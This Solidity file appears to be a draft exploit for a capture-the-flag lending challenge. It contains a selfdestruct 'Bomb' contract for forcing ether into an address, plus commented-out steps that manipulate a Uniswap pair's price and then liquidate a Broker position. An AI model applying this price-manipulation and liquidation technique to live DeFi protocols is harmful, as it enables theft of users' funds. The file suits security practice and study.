pragma solidity "0.8.0";

import "../public/Setup.sol";

contract Bomb {
    constructor(address to) payable {
        selfdestruct(payable(to));
    }
}

contract Exploit {
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Setup setup;
    Broker broker;
    IUniswapV2Pair pair;
    constructor(Setup _setup) payable {
        setup = _setup;
        pair = _setup.pair();
        broker = _setup.broker();
        weth.deposit{value: msg.value}();
        
        // broker.deposit(many);
        // broker.borrow(asMuchAsPossible);

        // pair.swap(_setup.token);    // deflate the price of token
        // broker.liquidate(address(setup), asMuchAsPossible);
        // broker.deposit(asMuchToCompensateDebt);
    }

    function mint() public payable returns (uint) {
        // new Bomb{value: 10 ether}(address(pair));

        // payable(address(pair)).transfer(10 ether);
        return pair.mint(address(this));
    }

    function getRate() public view returns (uint) {
        return setup.broker().rate();
    }

    function getTokenAddress() public view returns (address) {
        return address(setup.token());
    }
}